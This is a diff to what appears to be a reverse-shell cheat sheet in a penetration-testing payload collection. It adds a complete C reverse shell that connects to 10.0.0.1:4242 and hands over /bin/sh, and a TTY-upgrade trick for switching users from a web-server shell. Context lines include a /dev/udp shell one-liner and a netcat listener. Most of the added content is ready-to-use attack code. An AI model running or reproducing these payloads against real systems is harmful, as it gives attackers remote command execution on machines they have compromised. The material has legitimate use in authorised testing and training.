@@ -25,6 +25,7 @@
     * [NodeJS](#nodejs)
     * [Groovy](#groovy)
     * [Groovy Alternative 1](#groovy-alternative-1)
+    * [C](#c)
 * [Meterpreter Shell](#meterpreter-shell)
     * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
     * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
@@ -53,6 +54,8 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 Listener:
 nc -u -lvp 4242
 ```
+
+Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
 ### Socat
 
@@ -292,6 +295,41 @@ Thread.start {
 }
 ```
 
+### C
+
+Compile with `gcc /tmp/shell.c --output csh && csh`
+
+```csharp
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = 4242;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"/bin/sh", NULL};
+    execve("/bin/sh", argv, NULL);
+
+    return 0;       
+}
+```
+
 ## Meterpreter Shell
 
 ### Windows Staged reverse TCP
@@ -392,6 +430,19 @@ lua: os.execute('/bin/sh')
 - vi: `:set shell=/bin/bash:shell`
 - nmap: `!sh`
 - mysql: `! bash`
+
+Alternative TTY method
+
+```
+www-data@debian:/dev/shm$ su - user
+su: must be run from a terminal
+
+www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
+www-data@debian:/dev/shm$ su - user
+Password: P4ssW0rD
+
+user@debian:~$ 
+```
 
 ## Fully interactive reverse shell on Windows
 The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
